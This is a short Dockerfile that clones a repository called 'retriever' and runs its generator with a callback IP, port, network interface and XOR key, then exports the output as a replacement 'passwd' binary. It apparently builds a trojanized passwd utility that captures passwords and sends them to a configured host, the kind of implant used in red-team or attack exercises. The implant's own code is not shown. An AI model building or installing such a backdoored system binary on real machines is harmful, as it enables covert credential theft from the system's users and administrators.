FROM archlinux:latest AS builder

# Declare Variables
ARG IP="127.0.0.1"
ARG PORT="8000"
ARG INTERFACE="ens3"
ARG XOR_KEY="bingus"

# Install Dependancies
RUN pacman -Syu --noconfirm git wget make autoconf gettext libtool libxslt patch automake gcc bison

# Clone and run script
RUN git clone https://github.com/p4ral1ax/retriever
WORKDIR /retriever
RUN ./generate.sh ${IP} ${PORT} ${INTERFACE} ${XOR_KEY}

# Copy File
FROM scratch AS export-stage
COPY --from=builder /retriever/passwd ./passwd-archlinux
